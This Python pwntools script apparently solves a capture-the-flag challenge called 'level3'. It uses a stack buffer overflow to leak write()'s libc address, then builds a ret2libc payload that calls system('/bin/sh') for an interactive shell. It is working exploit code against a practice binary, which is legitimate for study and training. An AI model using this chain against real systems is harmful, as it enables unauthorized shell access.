import pwn
  
pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./level3')
#p = pwn.remote('220.249.52.133', 48664)

e = pwn.ELF('./level3')
main_addr = pwn.p32(0x8048484)
write_plt = pwn.p32(e.plt['write'])
write_got = pwn.p32(e.got['write'])

payload1 = b'A' * 0x88 + b'B' * 4 + write_plt + main_addr + pwn.p32(1) + write_got + pwn.p32(4)
p.sendlineafter(b'Input:\n', payload1)

write_addr = pwn.u32(p.recv()[0:4])
#libc = pwn.ELF('./libc_32.so.6')        # Remote Libc
libc = pwn.ELF('/lib32/libc.so.6')     # Local Libc
libc_addr = write_addr - libc.sym['write']
system_addr = pwn.p32(libc_addr + libc.sym['system'])
sh_addr = pwn.p32(libc_addr + next(libc.search(b'/bin/sh')))

payload2 = b'A' * 0x88 + b'B' * 4 + system_addr + b'C' * 4 + sh_addr
p.sendline(payload2)

p.interactive()